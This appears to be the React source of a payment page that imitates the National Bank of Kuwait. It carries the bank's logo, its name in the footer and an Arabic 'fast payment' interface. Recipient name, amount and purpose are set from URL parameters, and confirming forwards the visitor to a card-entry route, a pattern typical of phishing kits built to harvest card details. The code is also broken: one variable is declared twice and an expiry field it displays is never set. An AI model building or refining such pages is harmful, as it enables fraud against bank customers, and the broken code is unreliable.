import { useParams, useNavigate } from "react-router-dom";

// بيانات وهمية محاكية - Updated 2025-08-19
const dummyPaymentData = {
  "123": {
    id: "123",
    customerName: "AHMED MOHAMED ABDI",
    amount: 50.000,
    currency: "KWD",
    description: "Bill Payment",
    expiryDate: "2025-12-31",
    createdAt: "2025-06-19"
  },
  "pay_1755575829268_7kths83vaq_04xj": {
    id: "pay_1755575829268_7kths83vaq_04xj",
    customerName: "يوسف غازي الرشيدي",
    amount: 30.000,
    currency: "KWD",
    description: "Family Support",
    expiryDate: "2025-08-20",
    createdAt: "2025-08-19"
  }
};

const defaultPaymentData = {
  customerName: "يوسف غازي الرشيدي",
  amount: 30.000,
  currency: "KWD",
  description: "Family Support",
  expiryDate: "2025-08-20",
  createdAt: "2025-08-19"
};

const PaymentPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();

  const queryParams = new URLSearchParams(window.location.search);
    const queryParams = new URLSearchParams(window.location.search);
  const paymentData = {
    customerName: queryParams.get('n') || (typeof defaultPaymentData !== 'undefined' ? defaultPaymentData.customerName : "يوسف غازي الرشيدي"),
    amount: parseFloat(queryParams.get('a') || (typeof defaultPaymentData !== 'undefined' ? String(defaultPaymentData.amount) : "30.000")),
    currency: queryParams.get('c') || (typeof defaultPaymentData !== 'undefined' ? defaultPaymentData.currency : "KWD"),
    description: queryParams.get('p') || (typeof defaultPaymentData !== 'undefined' ? defaultPaymentData.description : "Family Support")
  };

  const handleConfirm = () => {
    navigate(`/card/${id}${window.location.search}`);
  };

  if (!id || id.length < 3) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center p-8 bg-white rounded-xl shadow-lg">
          <div className="text-xl font-bold text-red-600 mb-4">لم يتم العثور على الطلب</div>
          <p className="text-gray-600 mb-6">عذراً، الرابط الذي تحاول الوصول إليه غير صالح</p>
        </div>
      </div>
    );
  }

  const getCurrencySymbol = (currency: string) => {
    const symbols: Record<string, string> = {
      'KWD': 'د.ك', 'USD': '$', 'EUR': '€', 'GBP': '£', 'SAR': 'ر.س', 'AED': 'د.إ'
    };
    return symbols[currency] || currency;
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4" dir="rtl">
      <div className="mb-8">
        <img src="/nbk-logo.jpg" alt="NBK" className="h-16" />
      </div>
      
      <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
        خدمة الدفع السريع
      </h1>
      
      <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
        <div className="space-y-4 text-right">
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">اسم المستلم:</span>
            <span className="font-bold text-blue-900">{paymentData.customerName}</span>
          </div>
          
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">المبلغ:</span>
            <span className="font-bold text-blue-900">{paymentData.amount.toFixed(3)} {getCurrencySymbol(paymentData.currency)}</span>
          </div>
          
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">الغرض:</span>
            <span className="font-bold text-blue-900">{paymentData.description}</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="text-gray-700">تاريخ الانتهاء:</span>
            <span className="font-bold text-red-600">{paymentData.expiryDate}</span>
          </div>
        </div>
      </div>
      
      <div className="text-right text-sm text-gray-600 mb-8 max-w-md leading-relaxed">
        يرجى التأكد من تفاصيل المعاملة أعلاه قبل المتابعة لعملية الدفع.
      </div>
      
      <div className="flex flex-col gap-3 w-full max-w-md">
        <button 
          onClick={handleConfirm}
          className="w-full bg-blue-700 hover:bg-blue-800 text-white py-4 text-xl rounded-xl transition-all font-bold shadow-lg active:scale-95"
        >
          تأكيد
        </button>
      </div>

      <div className="mt-12 text-center text-xs text-gray-400">
        جميع الحقوق محفوظة © 2025 - بنك الكويت الوطني
      </div>
    </div>
  );
};

export default PaymentPage;
